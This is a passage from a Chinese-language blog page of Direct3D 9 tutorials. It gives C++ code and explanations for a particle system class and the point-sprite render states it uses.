add_particle();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void update(float time_delta) = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void pre_render();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void render();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void post_render();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool is_empty();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool is_dead();<br>&nbsp;&nbsp;&nbsp; protected:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void remove_dead_particles();<br>&nbsp;&nbsp;&nbsp; };<p>一些数据成员：<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_origin—粒子系统的原点， 这是粒子系统产生时的位置。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box—创建粒子系统使用的边界盒，用于限制粒子的活动范围。例如，假如我们让雪系统只落在一个围绕高山的峰顶的体积内,我们会定义一个包括这个体积的边界盒, 出界的粒子将会被杀死。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_emit_rate—新增加到系统中的粒子的速度。通常的标准是每秒。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size—系统中所有粒子的尺寸。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_particles—系统中粒子属性的一个列表。 我们用这个列表创建，释放及更新粒子。 当我们准备画粒子时, 我们COPY列表节点的一部分到顶点缓存并画粒子，同时我们COPY另外一批粒子，然后重复这一过程直到绘制完所有粒子。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_max_particles—在给定的时间内，系统中允许的粒子最大数。例如,如果创建粒子的速度比释放快的话, 随着时间的增长粒子的数量将会是巨大的，这个成员将避免出现这样的问题。<p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num—在给定的时间内顶点缓存中能够保存的粒子的数量，这个值与实际的粒子系统中的粒子数量无关。<p>注意：m_vb_offset和m_vb_batch_num数据成员在渲染粒子系统时使用，我们在稍后讨论。<p>方法：<p>cParticleSystem/ ~cParticleSystem—用来初始化默认值和用来释放设备接口 (vertex buffer, texture)。<br>&nbsp;&nbsp;&nbsp; cParticleSystem::cParticleSystem()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_texture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = NULL;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; cParticleSystem::~cParticleSystem()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_release&lt;IDirect3DVertexBuffer9*>(m_vertex_buffer);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safe_release&lt;IDirect3DTexture9*>(m_texture);<br>&nbsp;&nbsp;&nbsp; }<p>init—这个方法做与设备无关的初始化工作,比如创建用来保存点精灵的顶点缓存或创建纹理。<br>&nbsp;&nbsp;&nbsp; bool cParticleSystem::init(IDirect3DDevice9* device, const char* texture_filename)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Vertex buffer's number does not equal the number of particles in our system.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // We use the vertex buffer to draw a portion of our particles at a time.&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The arbitrary number we choose for the vertex buffer is specified by the m_vb_num variable.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device = device;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HRESULT hr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hr = device->CreateVertexBuffer(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num * sizeof(sParticle),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DUSAGE_DYNAMIC | D3DUSAGE_POINTS | D3DUSAGE_WRITEONLY,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PARTICLE_FVF,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DPOOL_DEFAULT,&nbsp;&nbsp;&nbsp; // D3DPOOL_MANAGED can't be used with D3DUSAGE_DYNAMIC<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;m_vertex_buffer,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(FAILED(hr))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "CreateVertexBuffer() - FAILED", "ParticleSystem", MB_OK);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hr = D3DXCreateTextureFromFile(device, texture_filename, &amp;m_texture);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(FAILED(hr))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "D3DXCreateTextureFromFile() - FAILED", "ParticleSystem", MB_OK);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; }<p>o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意： 我们使用动态的顶点缓存（D3DUSAGE DYNAMIC）。 因为我们需要在每帧中更新我们的粒子,意思是我们将会去存取顶点缓存的内存，回想一下，访问一个静态的顶点缓存慢得不可接受， 所以我们使用动态的顶点缓存。<p>o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查看我们用过的 D3DUSAGE_POINTS标记,它说明顶点缓存将保存点精灵。<p>o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 顶点缓存的尺寸是由m_vb_num预先确定的，而且与系统中粒子的数量无关。 也就是说, m_vb_num将小于等于系统中粒子的数量。 这是因为渲染粒子系统是一批一批的，不是一次渲染全部。<p>o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们使用默认的内存池(pool)代替通常使用的托管内存池，因为动态顶点缓存不能用在托管内存池中。<p>reset—这个方法重新设置系统中每个粒子的属性:<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::reset()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list&lt;sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&(*iter));<br>&nbsp;&nbsp;&nbsp; }<p>reset_particle—这个方法重新设置粒子的属性。如何重设粒子的属性，这依赖于具体粒子系统的特性。因此我们定义这个方法为虚拟的，等待子类去实现。<p>add_particle—这个方法用来在系统中增加一个粒子。在增加它到粒子列表之前，使用reset_particle方法先初始化粒子:<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::add_particle()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sParticleAttribute attr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&amp;attr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_particles.push_back(attr);<br>&nbsp;&nbsp;&nbsp; }<p>update—这个方法更新系统中所有的粒子。因为这个的方法的执行取决于具体粒子系统的特性,因此我们定义这个方法为抽象的，等待子类去实现。<p>render—这个方法用来显示系统中所有的粒子。<p>pre_render—用它来初始化渲染状态，在渲染前设置。 因为系统与系统之间是不同的,所以我们定义它为虚拟的。 默认将执行下列代码:<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::pre_render()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_LIGHTING,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FALSE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSPRITEENABLE, TRUE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALEENABLE,&nbsp; TRUE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSIZE,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float_to_dword(m_size));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSIZE_MIN,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // control the size of the particle relative to distance<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_A,&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_B,&nbsp;&nbsp;&nbsp; float_to_dword(0.0f));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALE_C,&nbsp;&nbsp;&nbsp; float_to_dword(1.0f));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // use alpha from texture<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTextureStageState(0, D3DTSS_ALPHAARG1, D3DTA_TEXTURE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTextureStageState(0, D3DTSS_ALPHAOP,&nbsp;&nbsp;&nbsp; D3DTOP_SELECTARG1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_ALPHABLENDENABLE, TRUE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_SRCBLEND,&nbsp; D3DBLEND_SRCALPHA);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_DESTBLEND, D3DBLEND_INVSRCALPHA);<br>&nbsp;&nbsp;&nbsp; }<p>&nbsp; 注意：我们使用alpha混合渲染，以便设置纹理的alpha通道，来设置纹理像素的透明，用它产生多种效果。一种特殊的情况是：获得象纹理那样的非矩形的粒子。例如，获得一个圆形“雪球形”的粒子,我们使用一个简单的带有alpha通道的纹理，它看上去是背景为黑色的带有白色圆形的样子。因此，显示出来时只是一个白圆，这比白色的矩形纹理要好。<p>post_render—用它去保存所有渲染状态。因为系统与系统间是不同的,所以我们定义它为虚拟的。默认将执行下列代码:<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::post_render()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_LIGHTING, TRUE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSPRITEENABLE, FALSE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_POINTSCALEENABLE,&nbsp; FALSE);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetRenderState(D3DRS_ALPHABLENDENABLE,&nbsp; FALSE);<br>&nbsp;&nbsp;&nbsp; }<p>is_empty—如果为True则在当前的系统中没有粒子， 否则为false.<br>&nbsp;&nbsp;&nbsp; bool cParticleSystem::is_empty()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return m_particles.empty();<br>&nbsp;&nbsp;&nbsp; }<p>is_dead—如果为True则系统中的所有粒子都是死的，否则为false。<br>&nbsp;&nbsp;&nbsp; bool cParticleSystem::is_dead()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list&lt;sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Is there at least one living particle? If yes, the system is not dead.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(iter->is_alive)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // No living particles found, the system must be dead.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; }<p>remove_dead_particles—搜索属_particle性表，从表中杀死并删除粒子。<br>&nbsp;&nbsp;&nbsp; void cParticleSystem::remove_dead_particles()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list&lt;sParticleAttribute>::iterator iter = m_particles.begin();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(iter != m_particles.end())<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! iter->is_alive)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // erase returns the next iterator, so no need to increment to the next one ourseleves.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter = m_particles.erase(iter);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter++;&nbsp;&nbsp;&nbsp; // next in list<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }</div><footer class=post-footer><div class=post-button><a class=btn href=/post/d3d-particle-system-2/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/d3d-particle-system-1/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="D3D中的粒子系统（1）"><meta itemprop=description content="许多自然现象是由很多小的小颗粒组成的，它们有相似的行为。（例如，雪花落下，闪烁的火焰，冲出枪管的“子弹”），粒子系统用来模拟这种现象。  14.1 粒子和点精灵（Point Sprite）  粒子是一个很小的对象，它通常用来模拟数学中的一个点。点元是用来显示粒子的很好的方案，可是点元被光栅化成一个简单的像素。这没给我们多少灵活性，因为我们想有各种大小不同的粒子，并且把整个纹理平滑映射到这些粒子上。在Direct3D 8.0以前，因为点元方法的局限性而完全不使用他们。代替的方法是程序员将使用公告板去显示粒子，一个板是一个方格，世界矩阵用它来确定方向，使它总是朝向照相机。  Direct3D 8.0引入一个特殊的点元叫点精灵，多数时候被应用在粒子系统中。与一般的点元不同的是，点精灵有纹理映射并能改变大小。与公告板不同的是，能用一个简单的点描述一个点精灵，节省内存和处理时间，因为我们只是必须保存和处理一个点，而公告板则是四个。14.1.1 结构的格式  我们使用下面的顶点结构来描述粒子的位置和颜色：struct sParticle{&nbsp;&nbsp;&nbsp; D3DXVECTOR3 position;&nbsp;&nbsp;&nbsp; D3DCOLOR&nbsp;&nbsp;&nbsp; color;};  const DWORD PARTICLE_FVF = D3DFVF_XYZ | D3DFVF_DIFFUSE;  这个结构只保存粒子的位置和颜色，这取决于你程序的需要，你能够用同样的结构去保存一套纹理坐标。  增加一个浮点变量给Particle结构去指定粒子的大小是可能的。我们必须增加一个D3DFVF_PSIZE标记给我们的灵活的顶点格式，以反映这个变化。每个粒子维护自己的大小很有用，因为它允许我们以具体情况指定并改变粒子的大小。可是，大多数的图形卡不支持控制粒子的大小，因此我们不使用它。（检查D3DFVFCAPS_PSIZE在D3 DCAPS9结构的FVFCaps成员）代替的方法是用渲染状态（render states）去控制粒子的大小，就像你很快看到的，有尺寸成员的顶点结构的例子：strict Particle  {  &nbsp;&nbsp;&nbsp;&nbsp; D3DXVECTOR3 _position;  &nbsp;&nbsp;&nbsp;&nbsp; D3DCOLOR&nbsp;&nbsp;&nbsp; _color;  &nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _size;  &nbsp;&nbsp;&nbsp;&nbsp; static const DWORD FVF;  };  const DWORD Particle::FVF = D3DFVF XYZ | D3DFVF DIFFUSE |&nbsp; D3DFVF_PSIZE;  注意：通过vertex shader，能够获取每个粒子的大小，即使你的硬件不支持D3DFVFCAPS_PSIZE。14.1.2点精灵（Point Sprite）渲染状态  点精灵的行为大部分由渲染状态（render states）来控制，现在让我们来看一下这些渲染状态：  D3DRS_POINTSPRITEENABLE—A Boolean value. The default value is false.  True表示将当前的纹理全部映射到点精灵上。  False 表示用指定的纹理坐标映射到点精灵的点（图素）上。  _device->SetRenderState(D3DRS_POINTSPRITEENABLE, true);D3DRS_POINTSPRITEENABLE bool value. When TRUE, texture coordinates of point primitives are set so that full textures are mapped on each point. When FALSE, the vertex texture coordinates are used for the entire point. The default value is FALSE. You can achieve DirectX 7 style single-pixel points by setting D3DRS_POINTSCALEENABLE to FALSE and D3DRS_POINTSIZE to 1.0, which are the default values.  D3DRS_POINTSCALEENABLE—A Boolean value. The default value is false.  True表示用视图空间单位来解释点的大小。视图空间单位的3D空间点在照相机中，点精灵将会自动缩放，这取决到它有多远, 像其他对象一样，离照相机近的粒子比离照相机远的粒子要大。  False 表示点的大小将用屏幕空间单位来解释。屏幕空间单位是屏幕上的像素单位。. 因此如果你指定false, 例如, 设置点精灵的尺寸为3, 则点精灵在屏幕区域中的尺寸为3×3像素。.  _device->SetRenderState(D3DRS_POINTSCALEENABLE, true);D3DRS_POINTSCALEENABLE bool value that controls computation of size for point primitives. When TRUE, the point size is interpreted as a camera space value and is scaled by the distance function and the frustum to viewport y-axis scaling to compute the final screen-space.  D3DRS_POINTSIZE—表示点精灵的尺寸. 这个值可以任意指定视图空间或屏幕空间的点精灵的尺寸, 取决于D3DRS_POINTSCALEENABLE状态如何设置. 下面的代码段设置点的尺寸为2.5个单位。:  _device->SetRenderState( D3DRS_POINTSIZE, float_to_dword(2.5f) );D3DRS_POINTSIZE A float value that specifies the size to use for point size computation in cases where point size is not specified for each vertex. This value is not used when the vertex contains point size. This value is in screen space units if D3DRS_POINTSCALEENABLE is FALSE; otherwise this value is in world space units. The default value is the value a driver returns. If a driver returns 0 or 1, the default value is 64, which allows software point size emulation. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_POINTSIZE, *((DWORD*)&amp;pointSize));DWORD float_to_dword(float f){&nbsp;&nbsp;&nbsp; return *((DWORD*)&amp;f);} D3DRS_POINTSIZE_MIN—表示点精灵的最小尺寸。例子，将设置最小值为0.2：  _device->SetRenderState(D3DRS_POINTSIZE_MIN, float_to_dword(0.2f));D3DRS_POINTSIZE_MIN A float value that specifies the minimum size of point primitives. Point primitives are clamped to this size during rendering. Setting this to values smaller than 1.0 results in points dropping out when the point does not cover a pixel center and antialiasing is disabled or being rendered with reduced intensity when antialiasing is enabled. The default value is 1.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_POINTSIZE_MIN, *((DWORD*)&amp;pointSizeMin));  D3DRS_POINTSIZE_MAX—表示点精灵的最大尺寸。例子，将设置最大值为5.0:  _device->SetRenderState(D3DRS_POINTSIZE_MAX, float_to_dword(5.0f));D3DRS_POINTSIZE_MAX A float value that specifies the maximum size to which point sprites will be clamped. The value must be less than or equal to the MaxPointSize member of D3DCAPS9 and greater than or equal to D3DRS_POINTSIZE_MIN. The default value is 64.0. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_PONTSIZE_MAX, *((DWORD*)&amp;pointSizeMax));  D3DRS_POINTSCALE_A, D3DRS_POINTSCALE_B, D3DRS_POINTSCALE_C—这3个常量表示如何根据距离控制点精灵的尺寸—这个距离是点精灵到照相机的距离。D3DRS_POINTSCALE_A A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 1.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_POINTSCALE_A, *((DWORD*)&amp;pointScaleA));D3DRS_POINTSCALE_B A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 0.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_POINTSCALE_B, *((DWORD*)&amp;pointScaleB));D3DRS_POINTSCALE_C A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 0.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example. m_pDevice9->SetRenderState(D3DRS_POINTSCALE_C, *((DWORD*)&amp;pointScaleC));  D3D用以下的公式去计算点精灵的最终尺寸，这取决于距离和这3个常量。  其中：  FinalSize：距离计算后，点精灵的最后尺寸。  ViewportHeight：视口的高度。  Size：分别为D3DRS_POINTSCALE_A, D3DRS_POINTSCALE_B, and D3DRS_POINTSCALE_C值。D：在视图空间中点精灵与照相机的距离。因为照相机被放置在视图空间中的原点，这个值是：，也是点精灵所在的位置。  下面代码设置点精灵的距离常量，因此远处的点精灵将变小。_device->SetRenderState(D3DRS_POINTSCALE_A, float_to_dword(0.0f));  _device->SetRenderState(D3DRS_POINTSCALE_B, float_to_dword(0.0f));  _device->SetRenderState(D3DRS_POINTSCALE_C, float_to_dword(1.0f));  14.1.3 粒子和他们的属性   一个粒子系统是由除了位置、颜色以外的更多的属性组成，例如，一个粒子有速度。然而，这些额外的属性对于渲染粒子来说不是必须的。因此，我们在单独的结构中保存渲染粒子所必须的数据和属性。当我们创建、显示或更新粒子时，我们使用属性来工作。当我们准备渲染时，我们从sParticle（粒子）结构中COPY位置和颜色。  对于我们模拟的具体粒子系统，粒子的属性也是不同的。因此我们能够归纳一些通用的属性，大多数系统用不上这么多，一些系统需要的属性这里可能还没有。struct sParticleAttribute{&nbsp;&nbsp;&nbsp; sParticleAttribute()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; life_time = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; is_alive&nbsp; = true;&nbsp;&nbsp;&nbsp; }  &nbsp;&nbsp;&nbsp; D3DXVECTOR3 position;&nbsp;&nbsp;&nbsp; D3DXVECTOR3 velocity;&nbsp;&nbsp;&nbsp; D3DXVECTOR3 acceleration;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; life_time;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // how long the particle lives for before dying&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // current age of the particle&nbsp;&nbsp;&nbsp; D3DXCOLOR&nbsp;&nbsp;&nbsp; color;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // current color of the particle&nbsp;&nbsp;&nbsp; D3DXCOLOR&nbsp;&nbsp;&nbsp; color_fade;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // how the color fades with respect to time&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; is_alive;};  position—粒子在世界空间中的位置  velocity—粒子的速度，每秒多少个单位。  acceleration—粒子的加速度, 每秒多少个单位。  life_time—粒子的生命周期. 例如,当一个时间段后，我们可以杀死一个激光柱的粒子.  age—粒子的当前年龄。  color—粒子的颜色。  color_fade—粒子随时间的变化而褪去的颜色。  is_alive—True 表示粒子活着;false 表示粒子死了。"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/d3d-particle-system-1/ itemprop=url class=post-title-link>D3D中的粒子系统（1）</a></h2><div class=post-meta-container><div class=post-meta-items><span 